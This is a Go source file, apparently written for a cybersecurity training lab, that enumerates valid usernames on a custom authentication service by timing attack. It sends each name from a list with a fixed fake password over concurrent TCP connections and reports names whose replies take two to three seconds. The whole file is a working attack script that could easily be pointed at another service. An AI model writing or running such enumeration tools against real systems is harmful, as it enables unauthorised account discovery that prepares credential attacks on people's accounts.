package main

import (
 "bufio"
 "fmt"
 "net"
 "os"
 "strings"
 "sync"
 "sync/atomic"
 "time"
)

const (
 serverAddress  = "labs.cyber-ed.space:30549"
 timeoutMin     = 2 * time.Second  // min time success username
 timeoutMax     = 3 * time.Second  // max time success username
 fakePassword   = "randompassword123"
 numWorkers     = 10               // thresds count
 progressUpdate = 500 * time.Millisecond // progress loader
)

var totalAttempts int64 // count of proceeded usernames

func main() {
 if len(os.Args) != 2 {
  fmt.Println("Usage: go run main.go <файл_с_usernames>")
  return
 }

 usernamesFile := os.Args[1]
 usernames, err := readLines(usernamesFile)
 if err != nil {
  fmt.Printf("Some shit with usernames: %v\n", err)
  return
 }

 total := int64(len(usernames))
 fmt.Printf("Total usernames: %d\n", total)

 startTime := time.Now()

 // channel for pushing username into workers
 jobs := make(chan string, numWorkers)
 var wg sync.WaitGroup

 // start workers
 for i := 0; i < numWorkers; i++ {
  wg.Add(1)
  go worker(jobs, &wg)
 }

 // gorutine for update progress
 go func() {
  for {
   time.Sleep(progressUpdate)

   completed := atomic.LoadInt64(&totalAttempts)
   percent := float64(completed) / float64(total) * 100
   elapsed := time.Since(startTime)

   // estimate time remaining
   avgTimePerReq := elapsed / time.Duration(completed+1)
   remainingTime := avgTimePerReq * time.Duration(total-completed)

   fmt.Printf("\rProgress: %.2f%% | Left: ~%v", percent, remainingTime)

   if completed >= total {
    break
   }
  }
 }()

 // send usernames into channel
 go func() {
  for _, username := range usernames {
   jobs <- username
  }
  close(jobs)
 }()

 wg.Wait()

 fmt.Println("\nYo, bro, we done.")
}

// worker - handles usernames
func worker(jobs <-chan string, wg *sync.WaitGroup) {
 defer wg.Done()

 for username := range jobs {
  startReqTime := time.Now()

  conn, err := net.Dial("tcp", serverAddress)
  if err != nil {
   fmt.Printf("\nWe are fucked up with connection: %v\n", err)
   continue
  }

  //  waiting for a welcome message
  response := readServerResponse(conn)
  if !strings.Contains(response, "220 Authentication Service Ready") {
   conn.Close()
   continue
  }

  _, err = conn.Write([]byte(fmt.Sprintf("USERPASS %s:%s\n", username, fakePassword)))
  if err != nil {
   conn.Close()
   continue
  }

  response = readServerResponse(conn)
  conn.Close()

  // resp time
  elapsed := time.Since(startReqTime)

  if elapsed >= timeoutMin && elapsed <= timeoutMax {
   fmt.Printf("\n[+] Hey, its look like what we found: %s (response time: %v)\n", username, elapsed)
  }

  atomic.AddInt64(&totalAttempts, 1)

  // pause before the next request to avoid overloading the server
  time.Sleep(200 * time.Millisecond)
 }
}

func readServerResponse(conn net.Conn) string {
 response := make([]byte, 1024)
 conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 n, err := conn.Read(response)
 if err != nil {
  return ""
 }
 return string(response[:n])
}

func readLines(filename string) ([]string, error) {
 file, err := os.Open(filename)
 if err != nil {
  return nil, err
 }
 defer file.Close()

 var lines []string
 scanner := bufio.NewScanner(file)
 for scanner.Scan() {
  lines = append(lines, strings.TrimSpace(scanner.Text()))
 }
 return lines, scanner.Err()
}